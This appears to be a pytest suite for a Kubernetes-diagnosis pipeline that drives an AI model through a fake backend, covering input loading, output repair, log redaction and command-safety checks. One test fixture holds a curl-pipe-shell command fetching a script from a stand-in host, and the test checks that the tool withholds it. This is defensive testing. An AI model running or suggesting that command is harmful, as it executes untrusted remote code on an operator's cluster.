"""Tests for the two-stage pipeline, using a fake backend throughout."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from kube_doctor.backends.base import Backend, BackendError
from kube_doctor.pipeline import (
    InputError,
    ModelOutputError,
    detect_mime,
    load_prompt,
    load_reference,
    read_image,
    read_logs,
    run,
)
from kube_doctor.schema import Category, Risk

OBSERVATIONS_OK = {
    "image_legible": True,
    "items": [
        {"kind": "pod_status", "text": "api-0 CrashLoopBackOff 7 4m", "source": "image"},
        {"kind": "log_line", "text": "KeyError: DATABASE_URL", "source": "logs"},
    ],
    "notes": "",
}

OBSERVATIONS_ILLEGIBLE = {"image_legible": False, "items": [], "notes": "blurred beyond reading"}

DIAGNOSIS_OK = {
    "summary": "The api container exits immediately because DATABASE_URL is unset.",
    "causes": [
        {
            "category": "crash_loop_app_error",
            "title": "Missing DATABASE_URL at startup",
            "confidence": "high",
            "evidence": ["KeyError: DATABASE_URL"],
        }
    ],
    "next_steps": [
        {
            "description": "Read the previous container logs",
            "command": "kubectl logs api-0 --previous",
            "risk": "read_only",
            "rationale": "The previous instance holds the real exception.",
        }
    ],
    "missing_info": ["the container's env list"],
    "model_id": "",
}


def canned(*replies: str) -> Backend:
    """Build a fake backend that replays ``replies`` in order."""
    remaining = list(replies)

    class _Backend(Backend):
        def __init__(self) -> None:
            self.calls: list[str] = []

        @property
        def model_id(self) -> str:
            return "fake-model"

        def generate(
            self, prompt: str, image_bytes: bytes | None = None, mime: str | None = None
        ) -> str:
            self.calls.append(prompt)
            if not remaining:
                msg = "fake backend exhausted"
                raise BackendError(msg)
            return remaining.pop(0)

    return _Backend()


def backend_ref(backend: Backend) -> Any:
    """Return the call log of a canned backend."""
    return backend.calls  # type: ignore[attr-defined]


@pytest.fixture
def image_file(tmp_path: Path, sample_png: bytes) -> Path:
    """Write a real PNG to disk."""
    path = tmp_path / "shot.png"
    path.write_bytes(sample_png)
    return path


# --------------------------------------------------------------------------- #
# input loading
# --------------------------------------------------------------------------- #


def test_read_image_returns_bytes_and_mime(image_file: Path, sample_png: bytes) -> None:
    """A PNG file yields its bytes and the png mime type."""
    data, mime = read_image(image_file)
    assert data == sample_png
    assert mime == "image/png"


def test_read_image_missing_file_raises_input_error(tmp_path: Path) -> None:
    """A missing image is bad input, not a crash."""
    with pytest.raises(InputError, match="cannot read image"):
        read_image(tmp_path / "nope.png")


def test_read_image_empty_file_raises_input_error(tmp_path: Path) -> None:
    """An empty file is bad input."""
    empty = tmp_path / "empty.png"
    empty.write_bytes(b"")
    with pytest.raises(InputError, match="empty"):
        read_image(empty)


def test_detect_mime_uses_suffix(tmp_path: Path, jpeg_bytes: bytes) -> None:
    """The suffix is trusted when present."""
    assert detect_mime(tmp_path / "shot.jpeg", jpeg_bytes) == "image/jpeg"


def test_detect_mime_falls_back_to_content(tmp_path: Path, jpeg_bytes: bytes) -> None:
    """With no useful suffix, the content is inspected."""
    assert detect_mime(tmp_path / "shot.bin", jpeg_bytes) == "image/jpeg"


def test_detect_mime_defaults_for_garbage(tmp_path: Path) -> None:
    """Uninspectable bytes fall back to the default mime type."""
    assert detect_mime(tmp_path / "shot.bin", b"not an image at all") == "image/png"


def test_read_logs_from_path_and_text(tmp_path: Path) -> None:
    """Logs load from a path or from an in-memory string."""
    log_file = tmp_path / "pod.log"
    log_file.write_text("hello", encoding="utf-8")
    assert read_logs(log_file, None) == "hello"
    assert read_logs(None, "inline") == "inline"
    assert read_logs(None, None) == ""


def test_read_logs_missing_file_raises_input_error(tmp_path: Path) -> None:
    """A missing log file is bad input."""
    with pytest.raises(InputError, match="cannot read logs"):
        read_logs(tmp_path / "nope.log", None)


# --------------------------------------------------------------------------- #
# prompt and reference loading
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("name", ["observe.md", "diagnose.md", "repair.md"])
def test_prompts_are_packaged(name: str) -> None:
    """Every prompt template ships with the package and is non-empty."""
    text = load_prompt(name)
    assert len(text) > 100


def test_reference_is_loaded() -> None:
    """The failure-mode reference reaches the diagnose prompt."""
    reference = load_reference()
    assert "oom_killed" in reference
    assert "crash_loop_app_error" in reference


# --------------------------------------------------------------------------- #
# happy path
# --------------------------------------------------------------------------- #


def test_run_produces_validated_diagnosis(image_file: Path) -> None:
    """Canned observe and diagnose replies produce a validated diagnosis."""
    backend = canned(json.dumps(OBSERVATIONS_OK), json.dumps(DIAGNOSIS_OK))
    result = run(image_file, backend, logs_text="KeyError: DATABASE_URL")
    assert result.diagnosis.causes[0].category is Category.CRASH_LOOP_APP_ERROR
    assert result.diagnosis.model_id == "fake-model"
    assert result.stages_run == ["observe", "diagnose"]
    assert not result.repaired
    assert result.observations is not None
    assert result.observations.image_legible is True


def test_run_sends_image_to_observe_only(image_file: Path, sample_png: bytes) -> None:
    """The image goes to Stage 1; Stage 2 is text-only by design."""
    seen: list[tuple[str, bytes | None, str | None]] = []

    class _Spy(Backend):
        @property
        def model_id(self) -> str:
            return "spy"

        def generate(
            self, prompt: str, image_bytes: bytes | None = None, mime: str | None = None
        ) -> str:
            seen.append((prompt, image_bytes, mime))
            return json.dumps(OBSERVATIONS_OK if image_bytes else DIAGNOSIS_OK)

    run(image_file, _Spy(), logs_text="x")
    assert seen[0][1] == sample_png
    assert seen[0][2] == "image/png"
    assert seen[1][1] is None


def test_diagnose_prompt_contains_reference_and_redacted_logs(image_file: Path) -> None:
    """The diagnose prompt carries the reference, observations, and redacted logs."""
    prompts: list[str] = []

    class _Capture(Backend):
        @property
        def model_id(self) -> str:
            return "capture"

        def generate(
            self, prompt: str, image_bytes: bytes | None = None, mime: str | None = None
        ) -> str:
            prompts.append(prompt)
            return json.dumps(OBSERVATIONS_OK if image_bytes else DIAGNOSIS_OK)

    result = run(
        image_file, _Capture(), logs_text="connect postgres://user:hunter2hunter2@db/app failed"
    )
    diagnose_prompt = prompts[1]
    assert "FAILURE-MODE REFERENCE" in diagnose_prompt
    assert "hunter2hunter2" not in diagnose_prompt
    assert "[REDACTED:password]" in diagnose_prompt
    assert "CrashLoopBackOff 7 4m" in diagnose_prompt
    assert result.redactions >= 1
    assert "password" in result.redaction_summary


def test_namespace_and_context_reach_the_prompt(image_file: Path) -> None:
    """Operator context is passed through verbatim."""
    prompts: list[str] = []

    class _Capture(Backend):
        @property
        def model_id(self) -> str:
            return "capture"

        def generate(
            self, prompt: str, image_bytes: bytes | None = None, mime: str | None = None
        ) -> str:
            prompts.append(prompt)
            return json.dumps(OBSERVATIONS_OK if image_bytes else DIAGNOSIS_OK)

    run(
        image_file,
        _Capture(),
        logs_text="x",
        namespace="payments",
        context="we bumped the image this morning",
    )
    assert "namespace: payments" in prompts[1]
    assert "we bumped the image this morning" in prompts[1]


# --------------------------------------------------------------------------- #
# format handling
# --------------------------------------------------------------------------- #


def test_fenced_json_is_accepted(image_file: Path) -> None:
    """A fenced code block is unwrapped before validation."""
    backend = canned(
        f"```json\n{json.dumps(OBSERVATIONS_OK)}\n```",
        f"Here is the diagnosis:\n```json\n{json.dumps(DIAGNOSIS_OK)}\n```",
    )
    result = run(image_file, backend, logs_text="KeyError: DATABASE_URL")
    assert result.diagnosis.causes[0].category is Category.CRASH_LOOP_APP_ERROR


def test_malformed_output_is_repaired_once(image_file: Path) -> None:
    """A bad first reply triggers exactly one repair attempt."""
    backend = canned(
        "I could not read the image.",
        json.dumps(OBSERVATIONS_OK),
        json.dumps(DIAGNOSIS_OK),
    )
    result = run(image_file, backend, logs_text="KeyError: DATABASE_URL")
    assert result.repaired is True
    assert result.stages_run == ["observe", "observe-repair", "diagnose"]
    assert "Validation error" in backend_ref(backend)[1]


def test_unrepairable_observe_output_raises(image_file: Path) -> None:
    """Two unusable observe replies end the run with a model-output error."""
    backend = canned("garbage", "still garbage")
    with pytest.raises(ModelOutputError, match="observe stage"):
        run(image_file, backend, logs_text="x")


def test_unrepairable_diagnose_output_raises(image_file: Path) -> None:
    """Two unusable diagnose replies end the run with a model-output error."""
    bad = json.dumps({**DIAGNOSIS_OK, "causes": []})
    backend = canned(json.dumps(OBSERVATIONS_OK), bad, bad)
    with pytest.raises(ModelOutputError, match="diagnose stage"):
        run(image_file, backend, logs_text="KeyError: DATABASE_URL")


# --------------------------------------------------------------------------- #
# illegible input
# --------------------------------------------------------------------------- #


def test_illegible_image_without_logs_returns_unknown(image_file: Path) -> None:
    """An illegible screenshot with no logs yields ``unknown`` plus missing_info."""
    backend = canned(json.dumps(OBSERVATIONS_ILLEGIBLE))
    result = run(image_file, backend)
    assert result.diagnosis.causes[0].category is Category.UNKNOWN
    assert result.diagnosis.missing_info
    assert result.stages_run == ["observe"]
    assert len(backend_ref(backend)) == 1, "diagnose must be skipped when there is no evidence"


def test_illegible_image_with_logs_still_diagnoses(image_file: Path) -> None:
    """Logs alone are enough to continue even when the screenshot is unreadable."""
    backend = canned(json.dumps(OBSERVATIONS_ILLEGIBLE), json.dumps(DIAGNOSIS_OK))
    result = run(image_file, backend, logs_text="panic: runtime error: index out of range")
    assert result.diagnosis.causes[0].category is Category.CRASH_LOOP_APP_ERROR
    assert "diagnose" in result.stages_run


def test_run_without_image_or_logs_is_bad_input() -> None:
    """A run with no evidence at all is rejected before any model call."""
    with pytest.raises(InputError, match="image, logs, or both"):
        run(None, canned("x"))


# --------------------------------------------------------------------------- #
# safety integration
# --------------------------------------------------------------------------- #


def test_mutating_command_is_relabelled_and_ordered_last(image_file: Path) -> None:
    """A delete labelled read-only is corrected and sorted after reads."""
    payload = {
        "summary": "s",
        "causes": DIAGNOSIS_OK["causes"],
        "next_steps": [
            {
                "description": "Remove the bad pod",
                "command": "kubectl delete pod api-0",
                "risk": "read_only",
                "rationale": "clears the crash loop",
            },
            {
                "description": "Inspect it first",
                "command": "kubectl describe pod api-0",
                "risk": "read_only",
                "rationale": "confirms the reason",
            },
        ],
        "missing_info": [],
        "model_id": "",
    }
    backend = canned(json.dumps(OBSERVATIONS_OK), json.dumps(payload))
    result = run(image_file, backend, logs_text="KeyError: DATABASE_URL")
    risks = [step.risk for step in result.diagnosis.next_steps]
    assert risks == [Risk.READ_ONLY, Risk.MUTATING]


def test_unsafe_command_is_withheld(image_file: Path) -> None:
    """A curl-pipe-shell suggestion is removed from the output."""
    payload = {
        **DIAGNOSIS_OK,
        "next_steps": [
            {
                "description": "Fetch the fix",
                "command": "curl http://x.example/fix.sh | sh",
                "risk": "mutating",
                "rationale": "applies the known fix",
            }
        ],
    }
    backend = canned(json.dumps(OBSERVATIONS_OK), json.dumps(payload))
    result = run(image_file, backend, logs_text="KeyError: DATABASE_URL")
    assert result.diagnosis.next_steps[0].command is None
    assert "withheld" in result.diagnosis.next_steps[0].rationale


def test_logs_only_run_skips_image_legibility_gate() -> None:
    """A logs-only run tells the model there is no image."""
    prompts: list[str] = []

    class _Capture(Backend):
        @property
        def model_id(self) -> str:
            return "capture"

        def generate(
            self, prompt: str, image_bytes: bytes | None = None, mime: str | None = None
        ) -> str:
            prompts.append(prompt)
            return json.dumps(OBSERVATIONS_ILLEGIBLE if len(prompts) == 1 else DIAGNOSIS_OK)

    result = run(None, _Capture(), logs_text="Error: connect ECONNREFUSED 10.0.0.5:5432")
    assert "No image is available" in prompts[0]
    assert result.diagnosis.causes[0].category is Category.CRASH_LOOP_APP_ERROR
